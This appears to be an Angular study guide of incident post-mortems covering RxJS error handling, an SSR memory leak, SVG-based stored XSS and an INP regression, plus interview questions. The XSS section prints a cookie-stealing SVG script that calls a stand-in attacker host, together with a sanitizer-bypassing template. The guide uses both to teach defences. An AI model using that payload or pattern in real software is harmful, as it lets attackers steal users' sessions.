# Production Incident Scenarios & Root-Cause Post-Mortems

> **Phase:** 8 — Real-World Projects  
> **Related:** [architecture-case-studies.md](./architecture-case-studies.md) | [debugging-exercises.md](../07-interview-preparation/debugging-exercises.md) | [scenario-based-questions.md](../07-interview-preparation/scenario-based-questions.md)

---

## Table of Contents

1. [Overview & The Production Incident Response Protocol](#overview--the-production-incident-response-protocol)
2. [Incident 1: Unhandled Stream Error Permanently Crashing Global Search](#incident-1-unhandled-stream-error-permanently-crashing-global-search)
3. [Incident 2: Node.js SSR Server Crashing with Out-of-Memory (OOM 137)](#incident-2-nodejs-ssr-server-crashing-with-out-of-memory-oom-137)
4. [Incident 3: Security Breach: Stored XSS via Malicious SVG Upload](#incident-3-security-breach-stored-xss-via-malicious-svg-upload)
5. [Incident 4: Catastrophic INP Regression (1,400ms) Post-Release](#incident-4-catastrophic-inp-regression-1400ms-post-release)
6. [Blameless Post-Mortem Engineering Framework](#blameless-post-mortem-engineering-framework)
7. [Senior Interview Questions with Detailed Answers](#senior-interview-questions-with-detailed-answers)
8. [Revision Checklist](#revision-checklist)

---

## Overview & The Production Incident Response Protocol

When high-severity incidents strike enterprise production environments, senior engineers are expected to lead triage with composure, structured methodology, and clear cross-functional communication:

```
[ Phase 1: TRIAGE & CONTAINMENT (First 15 mins) ]
  ├── Quantify user impact (error rates, affected routes, platform)
  ├── Isolate the failure domain (Frontend, API Gateway, CDN, DB)
  └── Implement containment (Rollback release, toggle feature flag, enable CDN bypass)

[ Phase 2: DIAGNOSIS & HOTFIX (15–60 mins) ]
  ├── Reproduce in staging environment
  ├── Inspect Sentry/Datadog stack traces and server telemetry
  └── Craft minimal, targeted hotfix with automated test

[ Phase 3: POST-MORTEM & PERMANENT REMEDIATION (Within 48 hours) ]
  ├── Document timeline and 5-Whys root cause analysis
  └── Establish preventative architectural guardrails (linters, CI tests, alerts)
```

---

## Incident 1: Unhandled Stream Error Permanently Crashing Global Search

### Symptoms & Incident Alert
At 09:14 AM on Black Friday, customer support received a surge of tickets: *"Search bar stops responding after typing any term."* Telemetry showed 0 search requests reaching the backend after a brief spike in HTTP 500 errors.

### Triage & Root Cause
A transient backend microservice hiccup returned a 500 Internal Server Error for query `"boots"`. 
Inspecting the Angular frontend code revealed:

```typescript
// ⚠️ VULNERABLE PRODUCTION CODE:
this.searchControl.valueChanges.pipe(
  debounceTime(300),
  switchMap(query => this.http.get(`/api/search?q=${query}`)),
  catchError(err => {
    // BUG: Catches error on the OUTER stream!
    // Returning of([]) completes the searchControl observable permanently!
    return of([]);
  })
).subscribe(results => this.results.set(results));
```

Because `catchError` was placed on the outer observable rather than inside `switchMap`, the unhandled error completed the `valueChanges` stream. Subsequent keystrokes were never emitted!

### Immediate Mitigation & Hotfix
Move `catchError` inside the inner observable to ensure the outer stream remains alive:

```typescript
// ✅ HOTFIX: Inner observable error containment
this.searchControl.valueChanges.pipe(
  debounceTime(300),
  switchMap(query =>
    this.http.get<SearchResult[]>(`/api/search?q=${query}`).pipe(
      catchError(err => {
        this.errorNotificationService.show('Search service temporarily degraded');
        return of([]); // Emits fallback, keeps searchControl alive!
      })
    )
  )
).subscribe(results => this.results.set(results));
```

---

## Incident 2: Node.js SSR Server Crashing with Out-of-Memory (OOM 137)

### Symptoms & Incident Alert
During a peak marketing campaign, the containerized Angular SSR Node.js service crashed repeatedly every 12 minutes with `Exit Code 137 (OOMKilled)`. CPU usage spiked to 100% and memory grew linearly until Docker terminated the pod.

### Triage & Root Cause
A heap snapshot of the Node.js server process revealed thousands of retained `TransferState` objects and per-request user metadata.
The root cause was identified in a shared state service:

```typescript
// ⚠️ VULNERABLE PRODUCTION SERVICE:
@Injectable({ providedIn: 'root' })
export class RequestContextService {
  // CRITICAL HAZARD IN SSR: Static variable shared across ALL concurrent user requests!
  private static userSessionCache = new Map<string, any>();

  setUserContext(userId: string, data: any) {
    RequestContextService.userSessionCache.set(userId, data); // Never evicted!
  }
}
```

In a browser, a singleton service exists only for one user. In Node.js SSR, a single Node process handles hundreds of concurrent users. The static `Map` accumulated every user's context in memory without eviction, triggering OOM and leaking user data across sessions!

### Immediate Mitigation & Hotfix
1. Remove static storage.
2. Scope per-request data to the request's `EnvironmentInjector` or Express `res.locals`.
3. Clear `TransferState` keys immediately after consumption.

---

## Incident 3: Security Breach: Stored XSS via Malicious SVG Upload

### Symptoms & Incident Alert
An automated AppSec crawler detected an unauthorized network connection originating from customer browsers to an external command-and-control server. An attacker had escalated privileges to Admin.

### Triage & Root Cause
The application allowed users to upload custom profile badges in SVG format. 
To render the badge, the developer used:
```html
<!-- ⚠️ VULNERABLE PRODUCTION TEMPLATE: -->
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(badgeSvg)"></div>
```
The attacker uploaded an SVG containing an embedded `<script>`:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker-c2.com/steal?c=' + document.cookie);
  </script>
</svg>
```
Because the developer called `bypassSecurityTrustHtml`, Angular's sanitizer was disabled, allowing the script to execute in the browser of any user viewing the profile!

### Immediate Mitigation & Hotfix
1. Ban `bypassSecurityTrustHtml` across the codebase using ESLint security rules.
2. Render SVGs via `<img>` tags rather than inline HTML (`<img [src]="badgeUrl" />`). When loaded via `<img>`, browsers strictly disable script execution inside SVGs!
3. Deploy a strict Content Security Policy (CSP) blocking inline scripts.

---

## Incident 4: Catastrophic INP Regression (1,400ms) Post-Release

### Symptoms & Incident Alert
Immediately following a sprint release, Google Chrome RUM telemetry showed **Interaction to Next Paint (INP)** degraded from 90ms to 1,400ms, triggering high user rage-clicks on catalog items.

### Triage & Root Cause
Using the Chrome DevTools Performance Profiler, engineers found long tasks lasting 800ms+ on every mouse hover.
The cause was an unoptimized template in a 500-item product list:

```html
<!-- ⚠️ VULNERABLE CODE: -->
<div *ngFor="let item of items; let i = index">
  <!-- BUG: Calling complex formatting function directly in template binding! -->
  <span>{{ calculateDynamicTierDiscount(item, userTier) }}</span>
</div>
```
Because the component lacked `ChangeDetectionStrategy.OnPush`, `calculateDynamicTierDiscount()` executed $500 \times \text{number of events}$ on every single mousemove or scroll event, locking the browser main thread!

### Immediate Mitigation & Hotfix
1. Apply `ChangeDetectionStrategy.OnPush`.
2. Replace template function calls with a pure pipe or `computed()` signals:
   ```html
   <span>{{ item | tierDiscount: userTier() }}</span>
   ```
3. Add a strict ESLint rule: `@angular-eslint/template/no-call-expression`.

---

## Blameless Post-Mortem Engineering Framework

Every incident must produce a post-mortem focusing on **process and system improvements**, not individual blame:

```markdown
# Incident Post-Mortem: [INC-2026-10-28] Global Search Outage

## Summary
On 2026-10-28 between 09:14 and 09:42 UTC, global search functionality was unavailable for 100% of web users due to an unhandled HTTP 500 error terminating the RxJS input stream.

## Root Cause (5-Whys)
1. Why did search stop responding? The RxJS `valueChanges` stream completed and stopped emitting.
2. Why did it complete? An unhandled HTTP error was caught by `catchError` on the outer pipe.
3. Why was it on the outer pipe? Developer lacked understanding of observable completion mechanics.
4. Why was this not caught in code review? Code review checklist lacked higher-order stream error verification.
5. Why was it not caught in automated testing? Unit tests only exercised the happy path.

## Preventative Action Items
- [ ] Add unit test verifying search resilience under HTTP 500 failure. (Owner: Dev Lead)
- [ ] Update team PR review checklist: "Verify catchError is inside switchMap/mergeMap". (Owner: Architect)
- [ ] Add synthetic monitoring ping testing live search every 60 seconds. (Owner: DevOps)
```

---

## Senior Interview Questions with Detailed Answers

### Q1: How do you structure an incident triage call when production is down and executive stakeholders are demanding immediate answers?
**Answer:**
1. **Designate Clear Roles:** Appoint an **Incident Commander (IC)** to lead technical triage, an **Operations Lead** to inspect logs/rollbacks, and a **Communications Lead** to update stakeholders every 15 minutes.
2. **Prioritize Containment Over Root-Cause Perfection:** The first objective is to restore service for users (e.g., rolling back the latest deployment, enabling a CDN maintenance page, or toggling a feature flag). Do not spend hours debugging broken code in production while users are failing.
3. **Establish Timeline & Collect Artifacts:** Snapshot logs, error traces, and metrics before deploying the fix.
4. **Conduct a Blameless Post-Mortem:** Identify systemic vulnerabilities in testing, CI/CD, and code review that allowed the bug to escape into production.

---

## Revision Checklist

- [ ] Explain why inner-observable error handling is vital in RxJS streams.
- [ ] Understand why static variables in Angular services cause memory leaks and cross-session data leaks in SSR.
- [ ] Mitigate SVG-based XSS attacks by enforcing `<img>` rendering and Content Security Policy.
- [ ] Diagnose INP performance regressions caused by template function calls.
- [ ] Lead a structured, blameless post-mortem using the 5-Whys methodology.
